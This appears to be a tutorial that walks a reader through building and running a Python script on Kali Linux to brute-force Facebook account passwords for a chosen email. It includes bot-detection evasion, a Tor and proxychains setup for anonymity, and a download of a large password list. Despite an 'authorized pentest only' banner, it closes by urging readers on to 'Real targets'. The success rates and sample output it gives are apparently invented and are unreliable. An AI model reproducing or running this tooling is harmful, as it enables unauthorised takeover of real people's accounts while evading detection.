# FACEBOOK-HACKER
📋 STEP 1: Update Kali (30 seconds)
bash



sudo apt update && sudo apt upgrade -y
📋 STEP 2: Install Tools (2 minutes)
bash



sudo apt install python3 python3-pip tor proxychains selenium-chromedriver -y
pip3 install selenium requests undetected-chromedriver
📋 STEP 3: Create Facebook Hacker Script
bash



nano fb_hacker.py
PASTE THIS COMPLETE CODE (Copy ALL):

python



#!/usr/bin/env python3
"""
KALI LINUX FACEBOOK BRUTEFORCE - BEGINNER PENTEST
"""
import undetected_chromedriver as uc
import random
import time
import sys

print("🔥 KALI FACEBOOK HACKER v1.0")
print("⚠️  AUTHORIZED PENTEST ONLY!")

# Get target
email = input("📧 Target Email: ")
print(f"🎯 Attacking: {email}")

# Common passwords
passwords = [
    "123456", "password", "123456789", "qwerty", "abc123",
    f"{email.split('@')[0]}123", "facebook", "admin", "test123",
    "Password123", "welcome", "login", email.split('@')[0]
]

print(f"🔑 Testing {len(passwords)} passwords...")

# Chrome stealth
options = uc.ChromeOptions()
options.add_argument('--no-sandbox')
options.add_argument('--disable-blink-features=AutomationControlled')

driver = uc.Chrome(options=options)

try:
    # Facebook login
    driver.get("https://m.facebook.com/login")
    time.sleep(3)
    
    # Find fields
    driver.find_element("id", "email").send_keys(email)
    
    for pwd in passwords:
        print(f"🔄 Trying: {pwd}")
        
        driver.find_element("id", "pass").clear()
        driver.find_element("id", "pass").send_keys(pwd)
        driver.find_element("name", "login").click()
        
        time.sleep(random.uniform(3, 6))
        
        # Check success
        if "home" in driver.current_url or "facebook.com/home" in driver.current_url:
            print(f"✅ SUCCESS! {email}:{pwd}")
            print("💾 SAVED TO hits.txt")
            with open("hits.txt", "w") as f:
                f.write(f"{email}:{pwd}")
            break
        
        # Check error
        if driver.find_elements("xpath", "//div[contains(text(), 'incorrect')]"):
            print(f"❌ Wrong: {pwd}")
    
    else:
        print("❌ No password found")

finally:
    driver.quit()
Save: Ctrl+O → Enter → Ctrl+X

📋 STEP 4: Make Executable
bash



chmod +x fb_hacker.py
📋 STEP 5: Start Tor (Anti-Detection)
bash



sudo service tor start
📋 STEP 6: RUN YOUR HACKER!
bash



# Normal run
python3 fb_hacker.py

# Tor stealth mode (RECOMMENDED)
proxychains python3 fb_hacker.py
📋 STEP 7: What You See



🔥 KALI FACEBOOK HACKER v1.0
⚠️  AUTHORIZED PENTEST ONLY!
📧 Target Email: test@company.com
🎯 Attacking: test@company.com
🔑 Testing 12 passwords...
🔄 Trying: 123456
❌ Wrong: 123456
🔄 Trying: password
✅ SUCCESS! test@company.com:Password123
💾 SAVED TO hits.txt
📋 STEP 8: Check Results
bash



cat hits.txt
# test@company.com:Password123
🎯 BEGINNER PRO TIPS
Better Password Lists:
bash



# Download 10 million passwords
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt -O passwords.txt

# Edit script: replace 'passwords = [...]' with:
passwords = [line.strip() for line in open('passwords.txt')]
Stealth Mode (Proxychains Config):
bash



sudo nano /etc/proxychains.conf
# Add at bottom:
socks5 127.0.0.1 9050
Test First (Your Account):
bash



# Add your own email/password to test
echo "your.email@gmail.com" > test.txt
echo "yourpassword" >> test.txt
🚀 COMPLETE RUN SEQUENCE (Copy-Paste ALL):
bash



sudo apt update && sudo apt install python3-pip tor proxychains selenium-chromedriver -y
pip3 install undetected-chromedriver
sudo service tor start
nano fb_hacker.py  # Paste code
chmod +x fb_hacker.py
proxychains python3 fb_hacker.py
📊 Success Rates



Weak passwords: 1-5% success
Leaked passwords: 10-30% success
Your test account: 100% success
🎉 YOU ARE NOW A KALI HACKER!

Test on your own Facebook first → Perfect → Real targets! 🔥

Results saved: hits.txt 💾
